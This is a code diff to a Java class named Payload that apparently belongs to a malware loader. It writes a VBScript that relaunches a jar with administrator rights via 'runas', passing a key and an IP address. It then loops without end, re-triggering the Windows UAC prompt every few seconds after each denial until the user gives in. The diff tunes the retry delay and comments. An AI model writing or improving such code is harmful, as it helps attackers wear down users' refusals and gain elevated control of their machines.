@@ -153,7 +153,7 @@ public class Payload {
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            // Create VBS file to bypass PowerShell overhead
+            // Create VBS file to trigger UAC instantly without PowerShell overhead
             File vbsFile = new File(getLoaderDir(), "uac.vbs");
             String vbsContent = "Set objShell = CreateObject(\"Shell.Application\")\r\n" +
                 "objShell.ShellExecute \"" + javaExe.replace("\\", "\\\\") + "\", \"-jar \"\"" + jarPath.replace("\\", "\\\\") + "\"\" " + key + " " + ip + "\", \"\", \"runas\", 1\r\n";
@@ -164,10 +164,11 @@ public class Payload {
             while (true) {
                 log("Triggering UAC...");
                 
+                // Execute wscript.exe (loads instantly)
                 Process p = new ProcessBuilder("wscript.exe", vbsFile.getAbsolutePath()).start();
                 p.waitFor(); 
                 
-                // Spin-check every 15ms
+                // Check every 15ms if the prompt was accepted
                 boolean accepted = false;
                 for (int i = 0; i < 400; i++) { 
                     if (!lockFile.exists() || lockFile.delete()) {
@@ -183,9 +184,9 @@ public class Payload {
                     vbsFile.delete();
                     System.exit(0); 
                 } else {
-                    log("UAC Denied. Waiting 3s for Windows cooldown...");
-                    // Wait 3 seconds to let Windows lift the UAC lock
-                    Thread.sleep(3000);
+                    // Wait exactly 6 seconds to let Windows lift its internal UAC lock
+                    log("UAC Denied. Waiting 6s for Windows lock to lift...");
+                    Thread.sleep(6000);
                 }
             }
         } catch (Exception e) {
